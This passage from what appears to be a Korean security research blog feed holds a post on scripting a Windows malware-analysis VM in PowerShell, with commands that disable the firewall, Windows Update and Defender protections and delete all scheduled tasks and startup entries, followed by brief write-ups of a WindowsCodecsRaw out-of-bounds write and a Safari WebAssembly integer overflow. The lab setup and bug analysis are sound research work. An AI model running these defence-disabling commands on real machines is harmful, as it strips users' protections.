class="hljs-number">91750</span>D7E.SlackMicrosoft.MicrosoftEdge.StableMicrosoft.GetstartedMicrosoft.YourPhone</code></pre><p>이름을 찾았는데 <code>Xbox</code>처럼 여러 개가 있는데 적기가 너무 귀찮다. 나는 한 번에 해치우고 싶다! 하시는 분은 <code>Microsoft.Xbox*</code>하시면 리눅스와 같이 <code>Microsoft.Xbox1</code> 등 뒤에 추가되어 있는(?) 뭐라 말해야 하지… 생각이 안 나네요! 아무튼! 저 문자열로 시작하는 친구들을 모두 삭제해줍니다!</p><p>그럼 이제 방화벽을 비활성화하러 가볼까요?</p><h1 id="방화벽-비활성화"><a href="#방화벽-비활성화" class="headerlink" title="방화벽 비활성화"></a>방화벽 비활성화</h1><p>방화벽 비활성화는 굉장히<del>~</del> 코드가 간단합니다.</p><p>도메인, 공용, 개인에 대한 방화벽 모두를 비활성화하면 되는데 요거는 PowerShell을 통해 한번에 작업할 수 있습니다. XD</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-NetFirewallProfile</span> <span class="hljs-literal">-Profile</span> Domain, Public, Private <span class="hljs-literal">-Enabled</span> False</code></pre><h1 id="Windows-Update-비활성화"><a href="#Windows-Update-비활성화" class="headerlink" title="Windows Update 비활성화"></a>Windows Update 비활성화</h1><p>Windows Update를 비활성화하기 위해서는 WindowsUpdate 레지스트리에 <code>NoAutoUpdate</code>를 설정해주면 됩니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;WindowsUpdate&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;AU&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NoAutoUpdate&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><h1 id="Windows-Defender-비활성화"><a href="#Windows-Defender-비활성화" class="headerlink" title="Windows Defender 비활성화"></a>Windows Defender 비활성화</h1><p>방화벽 비활성화는 Windows Defender 레지스트리에 <code>DisableAntiSpyware</code>만 추가를 해놓았었는데, flare-vm에서 사용하는 코드를 그대로 가져왔습니다.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_defender</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Disable Windows Defender&quot;</span>    <span class="hljs-keyword">try</span>    &#123;        <span class="hljs-built_in">Get-Service</span> WinDefend | <span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Force</span>        <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Start&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">4</span> <span class="hljs-literal">-Type</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    &#125;    <span class="hljs-keyword">catch</span>    &#123;        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed disable WinDefend Service&quot;</span>    &#125;    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Windows Defender&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableAntiSpyware&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Spynet&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SpyNetReporting&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SubmitSamplesConsent&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MRT&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\MRT&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DontReportInfectionInformation&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">-Not</span> ((<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> Win32_OperatingSystem).Version <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;6.1.7601&quot;</span>))    &#123;        <span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableArchiveScanning</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBehaviorMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBlockAtFirstSeen</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableCatchupQuickScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIntrusionPreventionSystem</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableIOAVProtection</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRealtimeMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRemovableDriveScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableRestorePoint</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningMappedNetworkDrivesForFullScan</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScanningNetworkFiles</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableScriptScanning</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableControlledFolderAccess</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-EnableNetworkProtection</span> AuditMode <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-MAPSReporting</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-SubmitSamplesConsent</span> NeverSend <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-PUAProtection</span> Disabled <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        &#125;&#125;</code></pre><p>WinDefend Service의 경우 에러가 뜨는 경우가 많아 try-catch 처리를 하였고, 마이크로소프트에 리포트를 보내는 것, 그리고 OS 버전이 6.1.7601 (Windows 7 Service Pack 1)이 아닐 경우 (Windows 10일 경우인 것 같습니다.) Defender에 추가된 다른 설정들을 비활성화해줍니다.</p><p>소스 코드를 가져와서 읽으면서 느낀 건 Windows 7 Service Pack 1로 검사하는 게 아니라 Windows 10과 Server 2019에 대한 Defender 명령어인 것 같은데 <code>[System.Envrionment]::OSVersion.Version.Major -eq 10</code>으로 Windows 10인지 확인하면 되지 않나? 싶었습니다.</p><p>사실상 저는 Windows 10 기준으로 스크립트를 작성했지만요.</p><h1 id="보안-유지-정책-알림-비활성화"><a href="#보안-유지-정책-알림-비활성화" class="headerlink" title="보안 유지 정책 알림 비활성화"></a>보안 유지 정책 알림 비활성화</h1><p>보안 유지 정책 알림 아이콘 비활성화입니다. 이건 굳이 필요 없어 보이긴 하지만 저는 빨간 불이 떠있다거나 느낌표가 떠있다거나 하면 신경이 굉장히 많이 쓰이는 사람이기에…</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%201.png"></p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;HideSCAHealth&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p>찾아보았더니 Microsoft Policies에 <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">HideSCAHealth 레지스트리</a>에 해당 부분을 비활성화할 수 있다는 사실을 알았습니다! 오예 바로 설정하죠! <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer</code>에 <code>HideSCAHealth</code>의 값을 1로 하면 해당 플래그가 설정되어 보안 알림 설정이 숨겨집니다!</p><h1 id="작업-스케줄러-삭제"><a href="#작업-스케줄러-삭제" class="headerlink" title="작업 스케줄러 삭제"></a>작업 스케줄러 삭제</h1><p>이제 Windows에 기본적으로 설정되어 있거나, 다른 애플리케이션을 추가하면서 등록된 불필요한 작업 스케줄러를 삭제할 시간입니다.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%202.png"></p><p>작업 스케줄러에 표시된 이 녀석들을 삭제를 하는 거죠. 이 작업엔 비하인드 에피소드가 있습니다. Task 리스트를 가져와서 모두 삭제를 해버리면 될 거라 생각했어요. 저 부분에 있는 친구들만 가져온다고 생각했습니다.</p><p>근데 테스트를 하는데… Windows 기능이 정상적으로 동작 안 하는 게 있는 거에요… 검색이 안 되고… 왜 이러지? 왜 이러지? 어디가 문제지? 하면서 함수 호출을 하나하나 주석 처리하다가 발견했습니다.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove_task</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$TS</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> Schedule.Service    <span class="hljs-variable">$TS</span>.Connect(<span class="hljs-variable">$env:COMPUTERNAME</span>)    <span class="hljs-variable">$TaskFolder</span> = <span class="hljs-variable">$TS</span>.GetFolder(<span class="hljs-string">&#x27;\&#x27;</span>)    <span class="hljs-variable">$Tasks</span> = <span class="hljs-variable">$TaskFolder</span>.GetTasks(<span class="hljs-number">1</span>)    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Task</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Tasks</span>)    &#123;        <span class="hljs-variable">$TaskFolder</span>.DeleteTask(<span class="hljs-variable">$Task</span>.Name, <span class="hljs-number">0</span>)    &#125;&#125;</code></pre><p>remove task는 ComObject를 통해 Schedule.Service에서 Task 리스트를 가져와서 삭제를 해줍니다. 시스템 스케줄까지 모두 삭제해버려서 발생한 해프닝이었습니다. ㅜ.ㅜ</p><h1 id="시작-프로그램-삭제"><a href="#시작-프로그램-삭제" class="headerlink" title="시작 프로그램 삭제"></a>시작 프로그램 삭제</h1><p>악성코드를 실행하고, 어떤 것들이 autorun 되는지 확인할 때 여러 잡다한 프로그램들이 실행되면 보기 힘들겠죠? 그래서 이것 또한 지워버립시다!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_startup</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-variable">$user</span> = <span class="hljs-built_in">New-Object</span> System.Security.Principal.NTAccount(<span class="hljs-variable">$env:username</span>)    <span class="hljs-variable">$sid</span> = (<span class="hljs-variable">$user</span>.Translate([<span class="hljs-type">System.Security.Principal.SecurityIdentifier</span>])).Value    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;Registry::HKEY_USERS\<span class="hljs-variable">$sid</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*&quot;</span> <span class="hljs-literal">-Recurse</span>&#125;</code></pre><p>특정 사용자에 한해 등록된 시작 프로그램은 그 사용자의 SID 경로를 통해 저장이 됩니다. 따라서 사용자에 따른 SID 값을 가져와서 삭제를 해주는 거죠! 일단은… 저렇게 지정을 했는데 안 지워지는 것들이 있더라구요…??? 이유를… 못 찾겠어서 남아있는 거는 손으로 지웠습니다.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled%203.png"></p><p>최종본을 가져올 때는 꼭 수정해서 가져올게요! 이번만 너그러이 봐주시면…</p><h1 id="숨김-파일-표시"><a href="#숨김-파일-표시" class="headerlink" title="숨김 파일 표시"></a>숨김 파일 표시</h1><p>이제 숨김 파일과 시스템 숨김 파일들을 표시해봅시다. 설치하고 숨김 파일을 체크하고 하는 것 또한 레지스트리를 통해서 작업할 수 있어요. Windows는 레지스트리를 통해서 이것저것 설정하니까요.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Hidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;ShowSuperHidden&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><p><code>Hidden</code>과 <code>ShowSuperHidden</code>의 값을 1로 설정해주면 끝입니다! 이제 기본적인 설정은 완료되었어요.</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>간단한 Windows 설정을 스크립트로 작성해보았습니다. 손으로 해도 얼마 안 걸리지만, 가끔 몇 개 까먹을 때도 있고 귀찮잖아요? 스크립트로 작성하면 실행만 하면 이 모든 것들을 <del>무료!</del> 까먹은 거 없이 설정할 수 있습니다.</p><p>다음 파트에서 chocolatey를 통해서 여러 가지 툴들을 설치하고 개인의 입맛에 맞게 작업 표시줄에 추가, 바탕화면 바로가기 만들기 등에 대해서 알아봅시다. 다음 파트가 모두 진행되고 나면 전체 소스 코드를 github에 올려서 링크를 걸어드리겠습니다! 마지막으로 해당 기능들을 구현할 때 참고 링크들을 작성하며 이만 물러가도록 하겠습니다. 그럼 안뇽~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>disable security maintenance icon: <a href="https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.TaskBar2::HideSCAHealth">https://admx.help/?Category=Windows_10_2016&amp;Policy=Microsoft.Policies.TaskBar2::HideSCAHealth</a></p><p>show hidden files: <a href="https://www.python2.net/questions-1237399.htm">https://www.python2.net/questions-1237399.htm</a></p><p>remove app list: <a href="https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list">https://community.spiceworks.com/topic/2230169-powershell-script-to-remove-xbox-gamebar-from-the-app-list</a></p><p>disable windows defender: <a href="https://github.com/fireeye/flare-vm/blob/master/install.ps1">https://github.com/fireeye/flare-vm/blob/master/install.ps1</a></p><p>disable windows update: <a href="https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell">https://social.technet.microsoft.com/Forums/lync/en-US/abde2699-0d5a-49ad-bfda-e87d903dd865/disable-windows-update-via-powershell?forum=winserverpowershell</a></p><p>get specific sid: <a href="https://techexpert.tips/powershell/powershell-get-user-sid/">https://techexpert.tips/powershell/powershell-get-user-sid/</a></p><p>remove all registry key under specific key: <a href="https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key">https://docs.microsoft.com/ko-kr/powershell/scripting/samples/working-with-registry-keys?view=powershell-7.1#removing-all-keys-under-a-specific-key</a></p><p>remove task: <a href="https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell">https://community.spiceworks.com/how_to/159324-delete-scheduled-task-with-powershell</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Research</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>idioth</tag>
+      
+      <tag>malware</tag>
+      
+      <tag>powershell</tag>
+      
+      <tag>automated</tag>
+      
+      <tag>virtual machine</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</title>
+    <link href="/2021/06/06/j0ker/2021-06-06/"/>
+    <url>/2021/06/06/j0ker/2021-06-06/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2137&q=&can=1&sort=-reported">Issue 2137: Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows에서는 Olympus E300의 raw 이미지 파일을 처리할 때, <code>Windows Imaging Component (WIC)</code>를 통해 처리합니다. 이 때 <code>WindowsCodecsRaw.dll</code>의 <code>COlympusE300LoadRaw::olympus_e300_load_raw()</code> 함수가 실행됩니다. 취약점이 발생한 함수의 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> CLASS <span class="hljs-title">olympus_e300_load_raw</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  uchar  *data,  *dp;  ushort *pixel, *pix;  <span class="hljs-keyword">int</span> dwide, row, col;  dwide = raw_width * <span class="hljs-number">16</span> / <span class="hljs-number">10</span>;               <span class="hljs-comment">// (1)</span>  data = <span class="hljs-built_in">malloc</span> (dwide + raw_width*<span class="hljs-number">2</span>);  merror (data, <span class="hljs-string">&quot;olympus_e300_load_raw()&quot;</span>);  pixel = (ushort *) (data + dwide);  <span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row &lt; height; row++) &#123;    fread (data, <span class="hljs-number">1</span>, dwide, ifp);    <span class="hljs-keyword">for</span> (dp=data, pix=pixel; pix &lt; pixel+raw_width; dp+=<span class="hljs-number">3</span>, pix+=<span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">//  (2)</span>      <span class="hljs-keyword">if</span> (((dp-data) &amp; <span class="hljs-number">15</span>) == <span class="hljs-number">15</span>) dp++;      pix[<span class="hljs-number">0</span>] = dp[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span> | dp[<span class="hljs-number">0</span>];                                    <span class="hljs-comment">// (3)</span>      pix[<span class="hljs-number">1</span>] = dp[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">4</span> | dp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>;                               <span class="hljs-comment">// (4)</span>    &#125;    <span class="hljs-keyword">for</span> (col=<span class="hljs-number">0</span>; col &lt; width; col++)      BAYER(row,col) = (pixel[col] &amp; <span class="hljs-number">0xfff</span>);  &#125;  <span class="hljs-built_in">free</span> (data);&#125;</code></pre><p>먼저 (1)에서 디코딩된 데이터를 저장할 메모리를 할당합니다. 디코딩은 열 단위로 디코딩을 진행하는데, 한 열에는 <code>height</code>만큼의 픽셀이 존재하며 픽셀은 각각 2 bytes의 데이터로 디코딩 됩니다. 그리고 (2)에서부터 실질적인 디코딩 작업이 진행됩니다. 조건문을 <code>pix &lt; pixel+raw_width</code>로 설정함으로써 디코딩 과정에서 OOB가 발생하지 않도록 신경썼지만 <code>raw_width</code>가 <code>0xd79</code>같이 홀수일 경우, 한 픽셀 당 2 bytes 씩 디코드하기 때문에 해당 loop의 마지막에서 (3)에서는 버퍼의 마지막에 데이터를 쓰지만 (4)에서 버퍼 밖의 메모리 영역에 데이터를 쓰게 되어 1 byte 의 OOB Write가 발생하게 됩니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>windows</tag>
+      
+      <tag>microsoft</tag>
+      
+      <tag>oob</tag>
+      
+      <tag>j0ker</tag>
+      
+      <tag>WindowsCodecsRaw</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>[하루한줄] CVE-2021-30734: Safari WebAssembly LLInt에서 발견된 Integer Overflow 취약점</title>
+    <link href="/2021/06/05/fabu1ous/2021-06-05/"/>
+    <url>/2021/06/05/fabu1ous/2021-06-05/</url>
+    
+    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/">Exploitation of a JavaScriptCore WebAssembly Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Safari &lt;14.1.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Safari의 WebAssembly는 세 단계를 거쳐 실행되는데 그 첫 번째 단계인 LLInt(Low Level Interpreter)에 interger overflow 취약점(CVE-2021-30734)이 발생하여 Safari 14.1.1 버전에서 패치되었습니다. LLInt의 Parser는 함수의 유효성을 검사하는 과정에서 <code>m_max_StackSize</code> 필드를 사용해 함수가 사용할 스택의 최대 크기를 추적합니다. 파싱이 끝나면 <code>m_max_StackSize</code> 값을 16 byte alignment로 맞추기 위해 <code>LLIntGenerator::Finalize</code> 함수를 호출해 반올림하고 <code>m_numCalleeLocals</code> 필드에 저장합니다. </p><p>만약 <code>m_max_StackSize</code> 값이 <code>0xffffffff</code>이라면 16 byte alignment를 맞추기 위해 올림 계산을 하게 되어 integer overflow가 발생하고 <code>m_numCalleeLocals</code>의 값이 <code>0x0</code>으로 저장됩니다. 